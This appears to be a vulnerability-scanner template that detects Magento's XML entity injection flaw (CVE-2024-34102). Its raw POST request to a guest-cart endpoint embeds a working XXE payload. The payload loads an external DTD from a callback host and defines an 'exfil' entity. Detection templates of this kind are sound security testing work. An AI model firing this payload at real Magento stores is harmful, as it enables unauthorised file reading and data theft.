id: CVE-2024-34102

info:
  name: Magento - XML Entity Injection
  author: omkar7505
  severity: critical
  description: Magento is vulnerable to XML Entity Injection 
  reference:
    - https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102


http:
  - raw:
      - |
        POST /rest/all/V1/guest-carts/test/estimate-shipping-methods HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Content-Type: application/json

        {"address": {"totalsReader": {"collectorList": {"totalCollector": {"sourceData": {"data": "<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"https://{{interactsh-url}}/dtd.xml\"> %sp; %param1; ]> <r>&exfil;</r>","options": 16}}}}}}

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"